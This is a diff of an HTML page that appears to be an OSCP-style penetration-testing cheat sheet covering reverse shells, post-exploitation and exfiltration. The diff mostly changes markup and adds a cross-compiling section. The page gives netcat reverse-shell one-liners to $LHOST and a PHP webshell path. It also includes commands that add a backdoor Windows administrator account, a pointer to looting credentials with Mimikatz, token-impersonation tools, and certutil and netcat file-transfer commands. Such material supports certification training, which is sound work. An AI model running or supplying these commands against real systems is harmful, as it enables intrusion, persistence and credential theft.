+<h3 class="code-line" data-line-start=175 data-line-end=176 ><a id="File_Upload_175"></a>File Upload</h3>
+<p class="has-line-data" data-line-start="176" data-line-end="177">Kali File Location: <code>/usr/share/webshells/php/php-reverse-shell.php</code> &lt;sup&gt;&lt;sub&gt;[<a href="files/php-reverse-shell.php">archive</a>]</p>
+<h2 class="code-line" data-line-start=178 data-line-end=179 ><a id="Netcat_Reverse_Shells_178"></a>Netcat Reverse Shells</h2>
+<h3 class="code-line" data-line-start=179 data-line-end=180 ><a id="Unix_179"></a>Unix</h3>
+<pre><code class="has-line-data" data-line-start="181" data-line-end="183" class="language-bash">nc <span class="hljs-operator">-e</span> /bin/sh <span class="hljs-variable">$LHOST</span> <span class="hljs-variable">$LPORT</span>
+</code></pre>
+<h3 class="code-line" data-line-start=184 data-line-end=185 ><a id="OpenBSD_184"></a>OpenBSD</h3>
+<pre><code class="has-line-data" data-line-start="186" data-line-end="188" class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>|nc <span class="hljs-variable">$LHOST</span> <span class="hljs-variable">$PORT</span> &gt;/tmp/f
+</code></pre>
+<h1 class="code-line" data-line-start=189 data-line-end=190 ><a id="3_PostExploitation_189"></a>3. Post-Exploitation</h1>
+<h2 class="code-line" data-line-start=191 data-line-end=192 ><a id="Linux_191"></a>Linux</h2>
+<h3 class="code-line" data-line-start=192 data-line-end=193 ><a id="Enumeration_Scripts_192"></a>Enumeration Scripts:</h3>
 <ul>
-<li>
-<p><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a> <sup><sub>[<a href="files/LinEnum.sh">archive</a>]</sub></sup></p>
+<li class="has-line-data" data-line-start="193" data-line-end="195">
+<p class="has-line-data" data-line-start="193" data-line-end="194"><a href="https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh">LinEnum.sh</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/LinEnum.sh">archive</a>]</p>
 </li>
-<li>
-<p><a href="https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py">linuxprivchecker.py</a> <sup><sub>[<a href="files/linuxprivchecker.py">archive</a>]</sub></sup></p>
+<li class="has-line-data" data-line-start="195" data-line-end="197">
+<p class="has-line-data" data-line-start="195" data-line-end="196"><a href="https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py">linuxprivchecker.py</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/linuxprivchecker.py">archive</a>]</p>
 </li>
-<li>
-<p><a href="https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh">unix-privesc-check.sh</a> <sup><sub>[<a href="files/upc.sh">archive</a>]</sub></sup></p>
+<li class="has-line-data" data-line-start="197" data-line-end="199">
+<p class="has-line-data" data-line-start="197" data-line-end="198"><a href="https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh">unix-privesc-check.sh</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/upc.sh">archive</a>]</p>
 </li>
 </ul>
-<h2 class="mume-header" id="windows">Windows</h2>
-
-<h3 class="mume-header" id="enumeration-scripts-1">Enumeration Scripts</h3>
-
+<h2 class="code-line" data-line-start=199 data-line-end=200 ><a id="Windows_199"></a>Windows</h2>
+<h3 class="code-line" data-line-start=200 data-line-end=201 ><a id="Enumeration_Scripts_200"></a>Enumeration Scripts</h3>
 <ul>
-<li>
-<p><a href="https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py">windows-exploit-suggester.py</a>  <sup><sub>[<a href="files/windows-exploit-suggester.py">archive</a>]</sub></sup></p>
+<li class="has-line-data" data-line-start="201" data-line-end="203">
+<p class="has-line-data" data-line-start="201" data-line-end="202"><a href="https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py">windows-exploit-suggester.py</a>  &lt;sup&gt;&lt;sub&gt;[<a href="files/windows-exploit-suggester.py">archive</a>]</p>
 </li>
-<li>
-<p><a href="https://github.com/pentestmonkey/windows-privesc-check">windows-privesc-check</a> <sup><sub>[<a href="files/windows_privesc_check.py">archive</a>]</sub></sup></p>
+<li class="has-line-data" data-line-start="203" data-line-end="205">
+<p class="has-line-data" data-line-start="203" data-line-end="204"><a href="https://github.com/pentestmonkey/windows-privesc-check">windows-privesc-check</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/windows_privesc_check.py">archive</a>]</p>
 </li>
-<li>
-<p><a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> <sup><sub>[<a href="files/Sherlock.ps1">archive</a>]</sub></sup></p>
+<li class="has-line-data" data-line-start="205" data-line-end="207">
+<p class="has-line-data" data-line-start="205" data-line-end="206"><a href="https://github.com/rasta-mouse/Sherlock">Sherlock</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/Sherlock.ps1">archive</a>]</p>
 </li>
 </ul>
-<h3 class="mume-header" id="resources">Resources</h3>
-
+<h3 class="code-line" data-line-start=207 data-line-end=208 ><a id="Resources_207"></a>Resources</h3>
 <ul>
-<li><a href="https://guif.re/windowseop">https://guif.re/windowseop</a></li>
+<li class="has-line-data" data-line-start="208" data-line-end="210"><a href="https://guif.re/windowseop">https://guif.re/windowseop</a></li>
 </ul>
-<h3 class="mume-header" id="creating-admin-account">Creating Admin Account</h3>
-
-<pre data-role="codeBlock" data-info="bash" class="language-bash"><span class="token comment"># Victim</span>
+<h3 class="code-line" data-line-start=210 data-line-end=211 ><a id="Creating_Windows_Admin_Account_210"></a>Creating Windows Admin Account</h3>
+<pre><code class="has-line-data" data-line-start="212" data-line-end="219" class="language-bash"><span class="hljs-comment"># Victim</span>
 net user /add jack sparrow
 net localgroup administrators jack /add
 
-<span class="token comment"># Connect with</span>
-rdesktop -u jim -p sparrow <span class="token punctuation">[</span>IP-ADDRESS<span class="token punctuation">]</span>
-</pre><h3 class="mume-header" id="tokens">Tokens</h3>
-
-<p>If you have admin, loot tokens &amp; creds with <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p>
-<p>If you have a service account, and want root - try token impersonation!</p>
+<span class="hljs-comment"># Connect with</span>
+rdesktop -u jim -p sparrow [IP-ADDRESS]
+</code></pre>
+<h3 class="code-line" data-line-start=220 data-line-end=221 ><a id="Tokens_220"></a>Tokens</h3>
+<p class="has-line-data" data-line-start="221" data-line-end="222">If you have admin, loot tokens &amp; creds with <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p>
+<p class="has-line-data" data-line-start="223" data-line-end="224">If you have a service account, and want root - try token impersonation!</p>
 <ul>
-<li><a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a></li>
-<li><a href="https://github.com/Re4son/Churrasco">Churrasco</a></li>
+<li class="has-line-data" data-line-start="225" data-line-end="226"><a href="https://github.com/ohpe/juicy-potato">Juicy Potato</a></li>
+<li class="has-line-data" data-line-start="226" data-line-end="228"><a href="https://github.com/Re4son/Churrasco">Churrasco</a></li>
 </ul>
-<h3 class="mume-header" id="using-python-scripts-without-python-installed">Using Python Scripts without Python installed</h3>
+<h3 class="code-line" data-line-start=228 data-line-end=229 ><a id="Using_Python_Scripts_without_Python_installed_228"></a>Using Python Scripts without Python installed</h3>
+<p class="has-line-data" data-line-start="229" data-line-end="230"><a href="https://github.com/pyinstaller/pyinstaller">PyInstaller</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/PyInstaller-3.6.zip">archive</a>]</p>
+<pre><code class="has-line-data" data-line-start="231" data-line-end="233" class="language-bash">pyinstaller yourprogram.py
+</code></pre>
+<h3 class="code-line" data-line-start=234 data-line-end=235 ><a id="Crosscompiling_for_Windows_234"></a>Cross-compiling for Windows</h3>
+<pre><code class="has-line-data" data-line-start="237" data-line-end="243"># x86
+i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
 
-<p><a href="https://github.com/pyinstaller/pyinstaller">PyInstaller</a> <sup><sub>[<a href="files/PyInstaller-3.6.zip">archive</a>]</sub></sup></p>
-<pre data-role="codeBlock" data-info="bash" class="language-bash">pyinstaller yourprogram.py
-</pre><h2 class="mume-header" id="exfiltration">Exfiltration</h2>
-
+# x64
+i686-w64-mingw32-gcc [src.c] [-libraries] -o [dst]
+</code></pre>
+<h2 class="code-line" data-line-start=244 data-line-end=245 ><a id="Exfiltration_244"></a>Exfiltration</h2>
 <ul>
-<li>SSH Copy (scp)</li>
+<li class="has-line-data" data-line-start="246" data-line-end="247">SSH Copy (scp)</li>
 </ul>
-<pre data-role="codeBlock" data-info="bash" class="language-bash"><span class="token function">scp</span> user@hostname:/path/to/src user@hostname:/path/to/dst
-</pre><ul>
-<li>Netcat</li>
+<pre><code class="has-line-data" data-line-start="248" data-line-end="250" class="language-bash">scp user@hostname:/path/to/src user@hostname:/path/to/dst
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="251" data-line-end="252">Netcat</li>
 </ul>
-<pre data-role="codeBlock" data-info="bash" class="language-bash"><span class="token comment"># Victim</span>
-<span class="token function">nc</span> -nvlp <span class="token variable">$RPORT</span> <span class="token operator">&gt;</span> out.file
+<pre><code class="has-line-data" data-line-start="253" data-line-end="259" class="language-bash"><span class="hljs-comment"># Victim</span>
+nc -nvlp <span class="hljs-variable">$RPORT</span> &gt; out.file
 
-<span class="token comment"># Kali</span>
-<span class="token function">nc</span> -nv <span class="token variable">$RHOST</span> <span class="token variable">$RPORT</span> <span class="token operator">&lt;</span> in.file
-</pre><ul>
-<li>exe2bat</li>
+<span class="hljs-comment"># Kali</span>
+nc -nv <span class="hljs-variable">$RHOST</span> <span class="hljs-variable">$RPORT</span> &lt; in.file
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="260" data-line-end="261">exe2bat</li>
 </ul>
-<pre data-role="codeBlock" data-info="bash" class="language-bash"><span class="token comment"># Convert a windows executable to a copy and paste set of commands</span>
-wine <span class="token variable"><span class="token variable">$(</span><span class="token function">locate</span> exe2bat.exe<span class="token variable">)</span></span> nc.exe nc.txt
-</pre><ul>
-<li>certutil.exe</li>
+<pre><code class="has-line-data" data-line-start="262" data-line-end="265" class="language-bash"><span class="hljs-comment"># Convert a windows executable to a copy and paste set of commands</span>
+wine $(locate exe2bat.exe) nc.exe nc.txt
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="266" data-line-end="267">certutil.exe</li>
 </ul>
-<pre data-role="codeBlock" data-info="bash" class="language-bash">certutil.exe -urlcache -split -f &#x201C;<span class="token variable">$URL</span>&#x201D; <span class="token variable">$FILENAME</span>
-</pre><ul>
-<li><a href="files/zip.vbs">zip.vbs</a> <sup><sub>[<a href="files/zip.vbs.txt">copy&amp;paste</a>]</sub></sup></li>
+<pre><code class="has-line-data" data-line-start="268" data-line-end="270" class="language-bash">certutil.exe -urlcache -split <span class="hljs-operator">-f</span> “<span class="hljs-variable">$URL</span>” <span class="hljs-variable">$FILENAME</span>
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="271" data-line-end="272"><a href="files/zip.vbs">zip.vbs</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/zip.vbs.txt">copy&amp;paste</a>]</li>
 </ul>
-<pre data-role="codeBlock" data-info="bash" class="language-bash">CScript zip.vbs <span class="token variable">$SRC</span> <span class="token variable">$DEST</span>
-</pre><ul>
-<li><a href="files/wget.vbs">wget.vbs</a> <sup><sub>[<a href="files/wget.vbs.txt">copy&amp;paste</a>]</sub></sup></li>
+<pre><code class="has-line-data" data-line-start="273" data-line-end="275" class="language-bash">CScript zip.vbs <span class="hljs-variable">$SRC</span> <span class="hljs-variable">$DEST</span>
+</code></pre>
+<ul>
+<li class="has-line-data" data-line-start="276" data-line-end="277"><a href="files/wget.vbs">wget.vbs</a> &lt;sup&gt;&lt;sub&gt;[<a href="files/wget.vbs.txt">copy&amp;paste</a>]</li>
 </ul>
-<pre data-role="codeBlock" data-info="bash" class="language-bash">CScript wget.vbs <span class="token variable">$SRC</span> <span class="token variable">$DEST</span>
-</pre>
-      </div>
-      
-      
-    
-    
-    
-    
-    
-    
-    
-    
-  
-    </body></html>
+<pre><code class="has-line-data" data-line-start="278" data-line-end="280" class="language-bash">CScript wget.vbs <span class="hljs-variable">$SRC</span> <span class="hljs-variable">$DEST</span>
+</code></pre>
+<h1 class="code-line" data-line-start=281 data-line-end=282 ><a id="Resources_281"></a>Resources</h1>
+<p class="has-line-data" data-line-start="282" data-line-end="286"><a href="https://sushant747.gitbooks.io/total-oscp-guide/">https://sushant747.gitbooks.io/total-oscp-guide/</a><br>
+<a href="https://guif.re/linuxeop">https://guif.re/linuxeop</a><br>
+<a href="https://guif.re/windowseop">https://guif.re/windowseop</a><br>
+<a href="https://github.com/rafiherm/OSCP">https://github.com/rafiherm/OSCP</a></p>
